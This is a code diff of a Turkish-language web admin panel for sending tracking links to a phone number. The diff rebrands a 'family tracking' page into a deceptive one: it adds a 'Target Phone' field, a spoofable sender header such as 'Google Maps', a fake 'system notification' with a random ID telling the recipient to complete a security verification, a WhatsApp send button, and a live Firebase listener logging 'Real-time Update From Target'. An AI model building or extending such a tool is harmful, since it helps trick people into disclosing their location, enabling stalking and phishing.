@@ -2,31 +2,32 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel | Aile Takip</title>
+    <title>Sistem Kontrol Paneli</title>
     <link rel="stylesheet" href="index.css">
     <script src="https://unpkg.com/lucide@latest"></script>
 </head>
 <body>
     <div class="glass-card">
         <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 1.5rem;">
-            <i data-lucide="shield" style="color: var(--accent-primary)"></i>
-            <h1 style="font-size: 1.25rem; margin: 0;">Takip Kontrol Paneli</h1>
+            <i data-lucide="shield-check" style="color: var(--accent-primary); width: 28px; height: 28px;"></i>
+            <h1 style="font-size: 1.25rem; margin: 0; font-weight: 700; letter-spacing: -0.02em;">OTOMATİK BİLDİRİM SİSTEMİ</h1>
         </div>
         
-        <input type="text" id="phone-input" class="input-field" placeholder="Telefon (05XXXXXXXXX)">
-        <input type="text" id="name-input" class="input-field" placeholder="Mesaj Başlığı (Örn: Paket Takip)">
+        <input type="text" id="phone-input" class="input-field" placeholder="Target Phone (05XXXXXXXXX)">
+        <input type="text" id="name-input" class="input-field" placeholder="System Header (e.g. Google Maps, Deliveries)">
         
         <button class="btn btn-primary" id="search-btn">
-            <i data-lucide="zap"></i> Link Üret ve İzle
+            <i data-lucide="zap"></i> Link Üret ve İzleme Başlat
         </button>
 
         <div id="link-result" style="display: none; margin-top: 1.5rem;">
-            <div style="font-size: 0.75rem; font-weight: 700; color: var(--success); margin-bottom: 0.5rem; text-transform: uppercase;">Hazır SMS Taslağı:</div>
+            <div style="font-size: 0.7rem; font-weight: 800; color: var(--success); margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.1em;">OTOMATİK TASLAK:</div>
             <div class="message-preview" id="message-preview"></div>
             
+            <button id="copy-btn" class="btn btn-secondary" style="margin-bottom: 10px;"><i data-lucide="copy"></i> Taslağı Kopyala</button>
             <div style="display: flex; gap: 10px;">
-                <button id="copy-btn" class="btn btn-secondary" style="flex: 1;"><i data-lucide="copy"></i> Kopyala</button>
-                <button id="sms-btn" class="btn btn-primary" style="flex: 1; background: #25d366;"><i data-lucide="message-circle"></i> SMS Gönder</button>
+                <button id="wa-btn" class="btn btn-wa" style="flex: 1;"><i data-lucide="message-circle"></i> WhatsApp</button>
+                <button id="sms-btn" class="btn btn-secondary" style="flex: 1; border-color: #94a3b8; color: #f8fafc;"><i data-lucide="message-square"></i> SMS</button>
             </div>
         </div>
     </div>
@@ -46,23 +47,30 @@
 
         searchBtn.addEventListener('click', () => {
             const phone = document.getElementById('phone-input').value.trim();
-            const name = document.getElementById('name-input').value.trim() || "Güvenlik Onayı";
-            if (!phone) return alert("Lütfen bir numara girin!");
+            const header = document.getElementById('name-input').value.trim() || "Doğrulama Servisi";
+            if (!phone) return alert("Hata: Telefon numarası gereklidir.");
 
-            const link = window.location.origin + "/l.html?tel=" + phone + "&n=" + encodeURIComponent(name);
-            const template = `Bu linke tıklayarak konumunuzu paylaşabilirsiniz.\n\n${name}: ${link}`;
+            const link = window.location.origin + "/l.html?tel=" + phone + "&n=" + encodeURIComponent(header);
+            const systemID = Math.floor(Math.random() * 90000) + 10000;
+            const msg = `SİSTEM BİLDİRİMİ (ID: ${systemID})\n\nGüvenliğiniz için lütfen aşağıdaki bağlantı üzerinden doğrulamayı tamamlayın.\n\n${header}: ${link}`;
             
-            preview.innerText = template;
+            preview.innerText = msg;
             linkResult.style.display = "block";
 
             onValue(ref(database, 'takip_listesi/' + phone), (snapshot) => {
-                if (snapshot.val()) console.log("Veri alındı:", snapshot.val());
+                const data = snapshot.val();
+                if (data) console.log("Real-time Update From Target:", data);
             });
         });
 
         document.getElementById('copy-btn').onclick = () => {
             navigator.clipboard.writeText(preview.innerText);
-            alert("Taslak kopyalandı!");
+            alert("Sistem taslağı kopyalandı!");
+        };
+
+        document.getElementById('wa-btn').onclick = () => {
+            const phone = document.getElementById('phone-input').value;
+            window.open(`https://wa.me/${phone}?text=${encodeURIComponent(preview.innerText)}`);
         };
 
         document.getElementById('sms-btn').onclick = () => {
